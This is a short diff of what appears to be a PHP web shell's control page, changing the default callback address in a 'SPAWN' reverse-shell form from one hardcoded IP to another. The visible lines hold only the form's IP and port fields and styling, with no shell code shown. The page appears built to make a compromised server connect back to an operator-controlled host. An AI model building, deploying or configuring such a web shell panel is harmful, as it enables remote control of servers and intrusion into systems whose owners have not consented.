@@ -435,7 +435,7 @@ if (isset($_GET['clear'])) {
                     <div style="color: #ff0; font-weight: bold; margin: 20px 0 15px 0;">STEP 2: Edit IP/PORT below, then click SPAWN</div>
                     <div style="margin-bottom: 10px;">
                         <label style="color: #0f0; display: block; margin-bottom: 5px;">Your IP:</label>
-                        <input type="text" id="shell-ip" value="31.57.184.148" style="width: 100%; padding: 10px; background: #000; border: 1px solid #0f0; color: #fff; font-family: monospace; font-size: 14px;">
+                        <input type="text" id="shell-ip" value="152.89.168.215" style="width: 100%; padding: 10px; background: #000; border: 1px solid #0f0; color: #fff; font-family: monospace; font-size: 14px;">
                     </div>
                     <div style="margin-bottom: 10px;">
                         <label style="color: #0f0; display: block; margin-bottom: 5px;">Your Port:</label>
